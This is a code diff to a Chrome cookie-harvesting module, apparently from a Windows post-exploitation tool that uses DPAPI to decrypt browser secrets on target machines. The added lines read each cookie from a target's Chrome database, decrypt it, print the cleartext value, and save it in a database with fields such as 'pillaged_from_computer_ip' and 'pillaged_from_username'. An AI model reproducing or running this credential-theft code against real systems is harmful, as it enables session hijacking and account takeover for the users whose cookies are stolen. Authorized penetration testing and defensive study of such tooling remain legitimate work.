@@ -1,5 +1,6 @@
 import sys
 import sqlite3,os,json,base64,binascii
+from datetime import datetime,timedelta
 from lib.toolbox import bcolors
 from lib.dpapi import *
 
@@ -152,6 +153,8 @@ class CHROME_LOGINS:
 		#path = '192.168.20.141\\Users\\Administrateur.TOUF\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
 		try:
 			if self.cookie_path!=None:
+				self.logging.debug(f"[{self.options.target_ip}] [+] Decrypting Chrome cookie in {self.cookie_path}")
+
 				if os.path.isfile(self.cookie_path):
 					connection = sqlite3.connect(self.cookie_path)
 					with connection:
@@ -160,22 +163,31 @@ class CHROME_LOGINS:
 							'select host_key, "TRUE", path, "FALSE", expires_utc, name, encrypted_value from cookies')
 						values = v.fetchall()
 
+					self.logging.debug(f"[{self.options.target_ip}] [+] Found {len(values)} Chrome cookies")
 					for host_key, _, path, _, expires_utc, name, encrypted_value in values:
-						#self.logging.debug(f"[{self.options.target_ip}] [+] Found Chrome cookie for {host_key}, {path}, {name},{value},{len(value)}")
+						self.logging.debug(f"[{self.options.target_ip}] [+] Found Chrome cookie for {host_key}, cookie name: {name}, expire at utc :{(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
 						self.cookies[host_key]={}
 						self.cookies[host_key][name]=self.decrypt_chrome_password(encrypted_value)
-						self.logging.debug(f"[{self.options.target_ip}] [+] Found Chrome cookie for {host_key}, {path}, {name},{self.cookies[host_key][name]}")
+						############PROCESSING DATA
+						self.db.add_cookies(credz_type='browser-chrome',
+						                  credz_name=name,
+						                  credz_value=self.cookies[host_key][name],
+						                  credz_expires_utc=expires_utc,
+									      credz_target=host_key,
+						                  credz_path='',
+						                  pillaged_from_computer_ip=self.options.target_ip,
+						                  pillaged_from_username=self.username)
+						self.logging.info(f"[{self.options.target_ip}] [+]  {bcolors.OKGREEN}[Chrome Cookie] {bcolors.ENDC} for {host_key} {bcolors.OKBLUE}[ {name}:{self.cookies[host_key][name]} ] {bcolors.ENDC} expire time: {(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
 
 		except sqlite3.OperationalError as e:
 			e = str(e)
 			if (e == 'database is locked'):
-				print('[!] Make sure Google Chrome is not running in the background')
+				self.logging.debug(f"[{self.options.target_ip}] [!] Make sure Google Chrome is not running in the background")
 			elif (e == 'no such table: logins'):
-				print('[!] Something wrong with the database name')
+				self.logging.debug(f"[{self.options.target_ip}] [!] Something wrong with the database name")
 			elif (e == 'unable to open database file'):
-				print('[!] Something wrong with the database path')
-			else:
-				print(e)
+				self.logging.debug(f"[{self.options.target_ip}] [!] Something wrong with the database path")
+			self.logging.debug(f"[{self.options.target_ip}] {e}")
 			return None
 
 		return self.cookies
